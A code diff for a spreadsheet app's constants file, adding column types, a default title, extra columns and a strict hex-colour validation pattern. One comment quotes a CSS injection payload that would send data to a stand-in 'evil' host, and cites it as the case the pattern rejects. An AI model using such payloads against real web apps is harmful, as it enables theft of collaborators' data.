@@ -335,9 +335,32 @@ const SHEET_REQUEST_STATUS = Object.freeze({
 const SHEET_COLUMN_TYPES = Object.freeze({
   TEXT: "TEXT",
   NUMBER: "NUMBER",
+
   DATE: "DATE",
+  TIME: "TIME",
+  DATETIME: "DATETIME",
+
   SELECT: "SELECT",
+  MULTI_SELECT: "MULTI_SELECT",
+
   CHECKBOX: "CHECKBOX",
+  BOOLEAN: "BOOLEAN",
+
+  EMAIL: "EMAIL",
+  PHONE: "PHONE",
+  URL: "URL",
+
+  CURRENCY: "CURRENCY",
+  PERCENTAGE: "PERCENTAGE",
+
+  FORMULA: "FORMULA",
+
+  FILE: "FILE",
+  IMAGE: "IMAGE",
+
+  RATING: "RATING",
+
+  TEXTAREA: "TEXTAREA",
 });
 
 /**
@@ -351,18 +374,46 @@ const SHEET_ALIGNMENTS = Object.freeze({
 });
 
 /**
- * The palette offered for text and fill colour.
+ * What a sheet is called when nobody has said.
  *
- * A fixed list rather than a free colour picker, and the reason is legibility
- * rather than taste: a picker lets someone set white text on a white fill, or a
- * fill dark enough to make the default black text unreadable — and because a
- * sheet is shared, they do it to everybody else's screen as well as their own.
- * These are chosen to stay readable against the grid's white background, and the
+ * Matches the wording every spreadsheet uses, because the string is doing more
+ * than filling a field: seeing "Untitled spreadsheet" in the title bar is what
+ * tells someone the name is theirs to change, where a blank title reads as a
+ * bug and a clever generated name reads as a decision already made.
+ */
+const DEFAULT_SHEET_TITLE = "Untitled spreadsheet";
+
+/**
+ * What counts as a colour.
+ *
+ * Any `#rrggbb`, and **only** that shape. These values are written straight into
+ * a `style` attribute in every collaborator's browser, so the question that
+ * matters is not which colours are tasteful but whether a string can carry
+ * anything besides a colour. A six-digit hex triplet cannot: there is no room in
+ * the grammar for a semicolon, a `url(`, or a second declaration, so the classic
+ * `red;background:url(https://evil/log?c=)` payload fails the pattern outright.
+ *
+ * This replaced a fixed whitelist of eleven swatches. The whitelist was airtight
+ * but it was answering a second question at the same time — legibility, on the
+ * theory that a picker lets someone set white on white for everybody. That is a
+ * real risk and it is now the user's to take: it is recoverable in one click,
+ * every other spreadsheet allows it, and enforcing taste through the security
+ * boundary meant nobody could have a brand colour either. The injection
+ * guarantee is unchanged, because it never depended on the list being short —
+ * only on the value being a colour and nothing else.
+ *
+ * Anchored, and case-insensitive with the result stored lowercased so `#FFF000`
+ * and `#fff000` are one value rather than two.
+ */
+const SHEET_COLOUR_PATTERN = /^#[0-9a-f]{6}$/i;
+
+/**
+ * The swatches the toolbar offers up front.
+ *
+ * No longer a security boundary — see SHEET_COLOUR_PATTERN — just a starting
+ * point, so the common case is one click and picking a custom colour is a
+ * deliberate second step. Text colours are chosen to stay readable on white,
  * fills to stay readable under dark text.
- *
- * Stored as hex strings rather than as names so the value is self-describing on
- * the wire and needs no lookup table on the client. Validated against this list
- * on write, so a hand-rolled request cannot inject arbitrary CSS.
  */
 const SHEET_TEXT_COLOURS = Object.freeze([
   "#0f172a", "#dc2626", "#ea580c", "#ca8a04",
@@ -401,6 +452,26 @@ const SHEET_DEFAULT_COLUMNS = Object.freeze([
   { name: "D", type: SHEET_COLUMN_TYPES.TEXT, width: 130 },
   { name: "E", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
   { name: "F", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "G", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "H", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "I", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "J", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "K", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "L", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "M", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "N", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "O", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "P", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "Q", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "R", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "S", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "T", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "U", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "V", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "W", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "X", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "Y", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
+  { name: "Z", type: SHEET_COLUMN_TYPES.TEXT, width: 150 },
 ]);
 
 const LIMITS = Object.freeze({
@@ -641,6 +712,8 @@ module.exports = {
   SHEET_ALIGNMENTS,
   SHEET_TEXT_COLOURS,
   SHEET_FILL_COLOURS,
+  SHEET_COLOUR_PATTERN,
+  DEFAULT_SHEET_TITLE,
   LIMITS,
   ERROR_CODES,
   DEFAULT_CURRENCY,
